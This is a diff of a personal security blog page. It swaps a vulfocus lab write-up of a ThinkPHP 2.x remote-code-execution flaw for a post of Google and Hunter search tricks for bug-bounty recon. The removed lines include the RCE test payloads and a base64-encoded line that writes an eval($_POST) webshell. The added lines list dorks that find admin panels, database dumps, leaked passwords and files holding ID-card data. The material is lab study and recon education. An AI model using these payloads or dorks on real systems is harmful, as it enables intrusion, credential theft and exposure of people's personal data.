@@ -16,30 +16,22 @@
   <meta name="author" content="3xsh0re">
   <meta name="keywords" content="">
   
-    <meta name="description" content="vulfocus靶场复现">
+    <meta name="description" content="有时候Google也能搜出许多有用的信息">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Thinkphp2.x_RCE漏洞原理分析">
-<meta property="og:url" content="https://3xsh0re.github.io/2023/08/12/Thinkphp2.x_RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/index.html">
+<meta property="og:title" content="搜索测绘资产技巧">
+<meta property="og:url" content="https://3xsh0re.github.io/2023/08/14/%E6%90%9C%E7%B4%A2%E6%B5%8B%E7%BB%98%E8%B5%84%E4%BA%A7%E6%8A%80%E5%B7%A7/index.html">
 <meta property="og:site_name" content="3xsh0re&#39;Blog">
-<meta property="og:description" content="vulfocus靶场复现">
+<meta property="og:description" content="有时候Google也能搜出许多有用的信息">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://3xsh0re.github.io/2023/08/12/Thinkphp2.x_RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/Snipaste_2023-08-12_20-25-00.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2023/08/12/Thinkphp2.x_RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/Snipaste_2023-08-13_16-28-05.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2023/08/12/Thinkphp2.x_RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/Snipaste_2023-08-13_16-29-56.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2023/08/12/Thinkphp2.x_RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/Snipaste_2023-08-13_16-33-42.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2023/08/12/Thinkphp2.x_RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/Snipaste_2023-08-13_16-37-47.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2023/08/12/Thinkphp2.x_RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/Snipaste_2023-08-13_16-40-05.png">
-<meta property="article:published_time" content="2023-08-12T12:22:25.000Z">
-<meta property="article:modified_time" content="2024-07-20T11:59:14.003Z">
+<meta property="article:published_time" content="2023-08-14T06:01:50.000Z">
+<meta property="article:modified_time" content="2024-09-17T14:22:48.988Z">
 <meta property="article:author" content="3xsh0re">
-<meta property="article:tag" content="漏洞分析">
-<meta property="article:tag" content="Thinkphp">
+<meta property="article:tag" content="SRC">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://3xsh0re.github.io/2023/08/12/Thinkphp2.x_RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/Snipaste_2023-08-12_20-25-00.png">
   
   
   
-  <title>Thinkphp2.x_RCE漏洞原理分析 - 3xsh0re&#39;Blog</title>
+  <title>搜索测绘资产技巧 - 3xsh0re&#39;Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -358,7 +350,7 @@ mjx-container[display="true"] + br {
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Thinkphp2.x_RCE漏洞原理分析"></span>
+            <span id="subtitle" data-typed-text="搜索测绘资产技巧"></span>
           
         </div>
 
@@ -369,8 +361,8 @@ mjx-container[display="true"] + br {
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-08-12 20:22" pubdate>
-          2023年8月12日 晚上
+        <time datetime="2023-08-14 14:01" pubdate>
+          2023年8月14日 下午
         </time>
       </span>
     
@@ -381,7 +373,7 @@ mjx-container[display="true"] + br {
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          771 字
+          4k 字
         
       </span>
     
@@ -392,7 +384,7 @@ mjx-container[display="true"] + br {
         
         
         
-          5 分钟
+          26 分钟
         
       </span>
     
@@ -437,12 +429,12 @@ mjx-container[display="true"] + br {
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Thinkphp2.x_RCE漏洞原理分析</h1>
+            <h1 id="seo-header">搜索测绘资产技巧</h1>
             
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2024年7月20日 晚上
+                    本文最后更新于：2024年9月17日 晚上
                   
                 
               </p>
@@ -450,46 +442,53 @@ mjx-container[display="true"] + br {
             
               <div class="markdown-body">
                 
-                <p>vulfocus靶场复现</p>
+                <p>有时候Google也能搜出许多有用的信息</p>
 <span id="more"></span>
 
-<h2 id="Thinkphp2-x-RCE复现"><a href="#Thinkphp2-x-RCE复现" class="headerlink" title="Thinkphp2.x_RCE复现"></a>Thinkphp2.x_RCE复现</h2><p>谷歌语法：<code>intext:ThinkPHP 2.1 { Fast &amp; Simple OOP PHP Framework }</code></p>
-<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p><a target="_blank" rel="noopener" href="https://www.webshell.cc/3955.html">一篇很老的文章</a></p>
-<p>存在原因是ThinkPHP2.x版本，使用preg_replace的<code>/e</code>模式匹配路由：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'@(w+)'</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">'([^'</span>.<span class="hljs-variable">$depr</span>.<span class="hljs-string">'/]+)@e'</span>, <span class="hljs-string">'$var['</span><span class="hljs-number">1</span><span class="hljs-string">']="2";'</span>, <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-variable">$depr</span>,<span class="hljs-variable">$paths</span>));<br></code></pre></td></tr></table></figure>
+<h4 id="Google基础语法"><a href="#Google基础语法" class="headerlink" title="Google基础语法"></a>Google基础语法</h4><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">intitle:</span> 搜索网页标题中包含有特定字符的网页。例如输入“intitle: <span class="hljs-keyword">cbi</span>”，这样网页标题中带有<span class="hljs-keyword">cbi</span>的网页都会被搜索出来。<br><br><span class="hljs-symbol">inurl:</span> 搜索包含有特定字符的URL。例如输入“inurl:<span class="hljs-keyword">cbi</span>”，则可以找到带有<span class="hljs-keyword">cbi</span>字符的URL。<br><br><span class="hljs-symbol">intext:</span> 搜索网页正文内容中的指定字符，例如输入“intext:<span class="hljs-keyword">cbi</span>”。这个语法类似我们平时在某些网站中使用的“文章内容搜索”功能。Filetype:搜索指定类型的文件。例如输入“filetype:<span class="hljs-keyword">cbi</span>”，将返回所有以<span class="hljs-keyword">cbi</span>结尾的文件URL。<br><br><span class="hljs-symbol">Site:</span> 找到与指定网站有联系的URL。例如输入“Site:family.chinaok.com”。所有和这个网站有联系的URL都会被显示。<br></code></pre></td></tr></table></figure>
 
-<p>这个代码是把pathinfo当作restful类型url进行解析的，主要作用是把pathinfo中的数据解析并合并到$_GET数组中。</p>
-<p>preg_replace(‘正则规则’,’替换字符’,’目标字符’)</p>
-<p>而<code>/e</code>模式会将替换字符当作PHP代码执行</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">'$var['</span><span class="hljs-number">1</span><span class="hljs-string">']="2";'</span><br></code></pre></td></tr></table></figure>
+<h4 id="Google语法：寻找登陆页面"><a href="#Google语法：寻找登陆页面" class="headerlink" title="Google语法：寻找登陆页面"></a>Google语法：寻找登陆页面</h4><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">inurl:</span>Login <br><span class="hljs-symbol"></span><br><span class="hljs-symbol">intitle:</span>后台登录管理员 <br><span class="hljs-symbol"></span><br><span class="hljs-symbol">intext:</span>后台登录 <br><span class="hljs-symbol"></span><br><span class="hljs-symbol">inurl:</span><span class="hljs-keyword">/admin/</span>login.php <br><span class="hljs-symbol"></span><br><span class="hljs-symbol">inurl:</span><span class="hljs-keyword">/phpmyadmin/</span>index.php 将返回含有phpmyadmin后台的网页<br><br>组合拳：<br><span class="hljs-symbol">intext:</span>后台登录  inurl:login.php<br><span class="hljs-symbol">intext:</span>后台登录  inurl:login.php -canvas<br></code></pre></td></tr></table></figure>
 
-<p>而这里又是双引号，而双引号中的php变量语法又是能够被解析执行的。因此，攻击者只要对任意一个使用thinkphp框架编写的应用程序，使用如下方式进行访问，即可执行任意PHP代码：</p>
-<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">index.php/module/action/param1/${@print(THINK_VERSION)}<br></code></pre></td></tr></table></figure>
+<h4 id="Google语法：eduSRC"><a href="#Google语法：eduSRC" class="headerlink" title="Google语法：eduSRC"></a>Google语法：eduSRC</h4><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim">intext:中学管理 inur<span class="hljs-variable">l:login</span><br>intext:幼儿园管理后台<br>intext:职业学院 inur<span class="hljs-variable">l:edu</span>.<span class="hljs-keyword">cn</span><br>intext:职业学院管理后台 inur<span class="hljs-variable">l:edu</span>.<span class="hljs-keyword">cn</span><br>intext:管理后台 inur<span class="hljs-variable">l:edu</span>.<span class="hljs-keyword">cn</span><br>intext:中学 inur<span class="hljs-variable">l:login</span>.php<br>intext:中学 + 后台管理 inur<span class="hljs-variable">l:login</span><br></code></pre></td></tr></table></figure>
 
-<p>写入木马：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(“M3gucGhw”),”w”),<span class="hljs-title function_ invoke__">base64_decode</span>(“PD9ldmFsKCRfUE9TVFt4XSk7Pz4=”))<br></code></pre></td></tr></table></figure>
+<h4 id="etc"><a href="#etc" class="headerlink" title="etc"></a>etc</h4><p>index of /admin 发现允许目录浏览的web网站</p>
+<p>index of /htdocs 用于查找未经授权的Web服务器，并通过‘htdocs‘文件夹查找所有敏感信息</p>
+<p>inurl:”/wp-admin/setup-config.php” intitle:”Setup Configuration File” 找未完成的安装Wordpress</p>
+<p>intitle:”Sign in · GitLab” 查找GitLab登录页面</p>
+<p>inurl:”.php?id=” “You have an error in your SQL syntax” 找到sql注入的网站</p>
+<p>“– MySQL Administrator dump” ext:sql 找到一些不错的数据库转储，可能包含用户名，密码和其他</p>
+<p>“mysqli_connect” ext:inc 查找包含MySQL用户名和密码的脚本</p>
+<p>“– MySQL dump” ext:sql -git 查找MySQL数据库转储，用户名，密码</p>
+<p>“PHP Fatal error: require()” ext:log 找到PHP错误日志</p>
+<p>“InnoDB:” ext:log 找到MySQL错误日志</p>
+<p>filetype:bak inurl:php “mysql_connect” 包含MySQL数据库密码的PHP备份</p>
+<p>inurl:”/admin/index.php?msg=” inurl:”%20” 找到可以XSS‘d和编辑的页面</p>
+<p>intitle:”Priv8 Mailer Inbox 2015” ext:php 只是另一个邮件：P请不要使用垃圾邮件</p>
+<p>inurl:”-wp13.txt” 找到MySQL，ABSPATH，Wordpress等配置文件</p>
+<p>intext:Table structure for table <code>wp_users</code> filetype:sql 网站数据库转储信息</p>
+<p>“Joomla! Administration Login” inurl:”/index.php” 查找Joomla管理员登录页面</p>
+<p>inurl:”/phpinfo.php” “PHP Version” 找到phpinfo（）页面</p>
+<p>inurl:”.php?cat=” inurl:”‘“ 查找易受SQL注入攻击的站点</p>
+<p>“Fatal NI connect error” “, connecting to:” ext:log 找到不同应用程序日志的全部负载</p>
+<p>inurl:”/attachment/“ ext:log 查找具有LOTS信息的Web应用程序日志</p>
+<p>intitle:”Log In to AR Web” 华为AR路由器登录面板</p>
+<p>inurl:”/debug/default” intitle:”Yii Debugger” Yii调试器PHP框架服务器信息</p>
+<h4 id="etc2："><a href="#etc2：" class="headerlink" title="etc2："></a>etc2：</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">site:http://gov.cn inurl:.login.asp (zf网站后台)<br>inurl:http://gov.cn/admin<br>inurl:gitlab 公司 filetype:txt<br>inurl:gitlab 公司 intext:账号<br>site:*. http://gitee.com intext:账号 （ ftp://*:* 密码 地址）<br>site:*. http://gitee.com filetype:txt 账号 （ ftp://*:* 密码 地址）<br>site:gitlab.*.com intext:密码<br>site: http://code.aliyun.com 2019 服务器地址<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">inurl:</span>备份 filetype:txt 密码<br><span class="hljs-symbol">inurl:</span>config.php filetype:bak<br><span class="hljs-symbol">inurl:</span>data<br><span class="hljs-string">"index of/"</span> xxx (mp3等等)<br>Index of /password<br><span class="hljs-string">"Index of /"</span> +passwd<br><span class="hljs-string">"Index of /"</span> +password.txt<br><span class="hljs-symbol">inurl:</span>phpMyAdmin<br><span class="hljs-symbol">inurl:</span>ewebeditor<br><span class="hljs-symbol">intitle:</span>后台管理<br><span class="hljs-symbol">intitle:</span>后台管理 inurl:admin<br><span class="hljs-symbol">inurl:</span>http:<span class="hljs-comment">//baidu.com</span><br><span class="hljs-symbol">inurl:</span>php?<span class="hljs-attr">id</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br><span class="hljs-symbol">inurl:</span>login<br><span class="hljs-symbol">site:</span> <span class="hljs-string">"身份证"</span> <span class="hljs-string">"学生证"</span> <span class="hljs-string">"1992"</span> <span class="hljs-string">"1993"</span> <span class="hljs-string">"1994"</span> <span class="hljs-string">"1995"</span> <span class="hljs-string">"1996"</span> <span class="hljs-string">"1997"</span> <span class="hljs-string">"1998"</span> <span class="hljs-string">"1999"</span> <span class="hljs-string">"2000"</span><br><span class="hljs-symbol">site:</span>.cn filetype:xls <span class="hljs-string">"服务器"</span> <span class="hljs-string">"地址"</span> <span class="hljs-string">"账号"</span><br><span class="hljs-symbol">site:</span>file.*.net（.com/.cn）<br><span class="hljs-symbol">inurl:</span>ali <span class="hljs-string">"管理平台"</span><br>cache<br><br>类似于百度快照功能，通过cache或许可以查看到目标站点删除的敏感文件<br>也可以用来解决找目标站点的物理路径不报错，而无法找到物理路径。<br><span class="hljs-symbol">cache:</span>[http:<span class="hljs-comment">//xxx.com](https://link.zhihu.com/?target=http%3A//xxx.com)</span><br><br>“” + - | AND<br>将要搜索的关键字用引号括起来，搜索引擎将会搜索完全匹配关键字的网页<br>“房产” +南京 <span class="hljs-comment">//搜索与南京有关的房产</span><br>“房产” -南京 <span class="hljs-comment">//搜索结果除去南京的房产</span><br>房产|酒店 <span class="hljs-comment">//搜索房产或者酒店有关的页面</span><br>房产 AND 酒店 <span class="hljs-comment">//搜索同时匹配房产与酒店这两个关键词的页面</span><br></code></pre></td></tr></table></figure>
+
+
+<p>对限定目标类型的语法：</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">inurl:</span>gitlab 公司 filetype:txt<br><span class="hljs-symbol">inurl:</span>gitlab 公司 intext:账号<br><span class="hljs-symbol">site:</span>*.http:<span class="hljs-comment">//gitee.com intext:账号 （ftp://*:* 密码 地址）</span><br><span class="hljs-symbol">site:</span>*.http:<span class="hljs-comment">//gitee.com filetype:txt 账号 （ftp://*:* 密码 地址）</span><br><span class="hljs-symbol">site:</span>gitlab.*.com intext:密码<br><span class="hljs-symbol">site:</span>http:<span class="hljs-comment">//code.aliyun.com 2019 服务器地址</span><br></code></pre></td></tr></table></figure>
+
+<p>对限定域名的语法：</p>
+<p>site:<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a><br>site:<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a> filetype: txt (doc docx xls xlsx txt pdf等)<br>site:<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a> intext:管理<br>site:<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a> inurl:login<br>site:<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a> intitle:管理<br>site:<a href="https://link.zhihu.com/?target=http://a2.xxxx.com">http://a2.xxxx.com</a> filetype:asp(jsp php aspx等)<br>site:<a href="https://link.zhihu.com/?target=http://a2.xxxx.com">http://a2.xxxx.com</a> intext:ftp://<em>:</em>(地址 服务器 虚拟机 password等)<br>site:<a href="https://link.zhihu.com/?target=http://a2.xxxx.com">http://a2.xxxx.com</a> inurl:file(load)<br>site:<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a> intext:*@<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a> //得到N个邮件地址，还有邮箱的主人的名字什么的<br>site:<a href="https://link.zhihu.com/?target=http://xxxx.com">http://xxxx.com</a> intext:电话 //N个电话</p>
+<h4 id="鹰图语法：eduSRC"><a href="#鹰图语法：eduSRC" class="headerlink" title="鹰图语法：eduSRC"></a>鹰图语法：eduSRC</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">title</span>=<span class="hljs-string">"职业技术"</span> || <span class="hljs-attribute">title</span>=<span class="hljs-string">"小学"</span> || <span class="hljs-attribute">title</span>=<span class="hljs-string">"初中"</span> || <span class="hljs-attribute">title</span>=<span class="hljs-string">"高中"</span> || <span class="hljs-attribute">title</span>=<span class="hljs-string">"附属中学"</span> || <span class="hljs-attribute">title</span>=<span class="hljs-string">"一中"</span> || <span class="hljs-attribute">title</span>=<span class="hljs-string">"二中"</span> || <span class="hljs-attribute">title</span>=<span class="hljs-string">"中学"</span> || <span class="hljs-attribute">title</span>=<span class="hljs-string">"中等专业学校"</span> &amp;&amp; <span class="hljs-attribute">country</span>=<span class="hljs-string">"CN"</span> &amp;&amp; region!=<span class="hljs-string">"HK"</span><br><br><span class="hljs-attribute">title</span>=<span class="hljs-string">"大学"</span> || <span class="hljs-attribute">title</span>=<span class="hljs-string">"职业技术"</span> || <span class="hljs-attribute">title</span>=<span class="hljs-string">"初中"</span> || <span class="hljs-attribute">title</span>=<span class="hljs-string">"学校"</span> || <span class="hljs-attribute">title</span>=<span class="hljs-string">"高中"</span> || <span class="hljs-attribute">title</span>=<span class="hljs-string">"中学"</span> || <span class="hljs-attribute">title</span>=<span class="hljs-string">"中等专业学校"</span> || <span class="hljs-attribute">org</span>=<span class="hljs-string">"China Education and Research Network Center"</span> &amp;&amp; <span class="hljs-attribute">country</span>=<span class="hljs-string">"CN"</span> &amp;&amp; region!=<span class="hljs-string">"HK"</span><br><br><span class="hljs-attribute">title</span>=<span class="hljs-string">"后台"</span>&amp;&amp;((title="小学"||title="初中"||title="高中"||title="中学"))<br><br><span class="hljs-attribute">title</span>=<span class="hljs-string">"后台"</span>&amp;&amp;web.body="中学"<br><br><span class="hljs-attribute">title</span>=<span class="hljs-string">"后台管理"</span>&amp;&amp;web.body="职业学院"<br><br><span class="hljs-attribute">title</span>=<span class="hljs-string">"中学"</span>&amp;&amp;app.vendor="PHP"&amp;&amp;web.body="管理系统"<br></code></pre></td></tr></table></figure>
 
 
 
-<h3 id="Vulfocus靶场复现"><a href="#Vulfocus靶场复现" class="headerlink" title="Vulfocus靶场复现"></a>Vulfocus靶场复现</h3><p>选择在vulfocus开启一个本地镜像进行复现学习。</p>
-<img src="/2023/08/12/Thinkphp2.x_RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/Snipaste_2023-08-12_20-25-00.png" srcset="/img/loading.gif" lazyload class="">
-
-<p>测试是否存在，拼接路由<code>/index.php/module/action/param1/${@phpinfo()}</code></p>
-<img src="/2023/08/12/Thinkphp2.x_RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/Snipaste_2023-08-13_16-28-05.png" srcset="/img/loading.gif" lazyload class="">
 
 
-
-<p>使用漏洞利用工具扫描，得到相同的结果</p>
-<img src="/2023/08/12/Thinkphp2.x_RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/Snipaste_2023-08-13_16-29-56.png" srcset="/img/loading.gif" lazyload class="">
-
-<p>存在<code>tp2_lite_code_exec</code>漏洞，传马Getshell</p>
-<img src="/2023/08/12/Thinkphp2.x_RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/Snipaste_2023-08-13_16-33-42.png" srcset="/img/loading.gif" lazyload class="">
-
-<p>使用蚁剑连接，</p>
-<img src="/2023/08/12/Thinkphp2.x_RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/Snipaste_2023-08-13_16-37-47.png" srcset="/img/loading.gif" lazyload class="">
-
-<p>找到flag，通关</p>
-<img src="/2023/08/12/Thinkphp2.x_RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/Snipaste_2023-08-13_16-40-05.png" srcset="/img/loading.gif" lazyload class="">
 
                 
               </div>
@@ -508,7 +507,7 @@ mjx-container[display="true"] + br {
     
       <span class="category-chain">
         
-  <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="category-chain-item">漏洞分析</a>
+  <a href="/categories/SRC/" class="category-chain-item">SRC</a>
   
   
 
@@ -523,9 +522,7 @@ mjx-container[display="true"] + br {
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="print-no-link">#漏洞分析</a>
-      
-        <a href="/tags/Thinkphp/" class="print-no-link">#Thinkphp</a>
+        <a href="/tags/SRC/" class="print-no-link">#SRC</a>
       
     </div>
   
@@ -537,8 +534,8 @@ mjx-container[display="true"] + br {
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Thinkphp2.x_RCE漏洞原理分析</div>
-      <div>https://3xsh0re.github.io/2023/08/12/Thinkphp2.x_RCE漏洞原理分析/</div>
+      <div>搜索测绘资产技巧</div>
+      <div>https://3xsh0re.github.io/2023/08/14/搜索测绘资产技巧/</div>
     </div>
     <div class="license-meta">
       
@@ -550,7 +547,7 @@ mjx-container[display="true"] + br {
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年8月12日</div>
+          <div>2023年8月14日</div>
         </div>
       
       
@@ -582,9 +579,9 @@ mjx-container[display="true"] + br {
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/08/14/%E6%90%9C%E7%B4%A2%E6%B5%8B%E7%BB%98%E8%B5%84%E4%BA%A7%E6%8A%80%E5%B7%A7/" title="搜索测绘资产技巧">
+                      <a href="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="GO学习笔记">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">搜索测绘资产技巧</span>
+                        <span class="hidden-mobile">GO学习笔记</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -592,8 +589,8 @@ mjx-container[display="true"] + br {
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/08/04/SRC%E4%B9%8BThinkPHP%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" title="SRC之ThinkPHP信息泄露">
-                        <span class="hidden-mobile">SRC之ThinkPHP信息泄露</span>
+                      <a href="/2023/08/12/Thinkphp2.x_RCE%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/" title="Thinkphp2.x_RCE漏洞原理分析">
+                        <span class="hidden-mobile">Thinkphp2.x_RCE漏洞原理分析</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
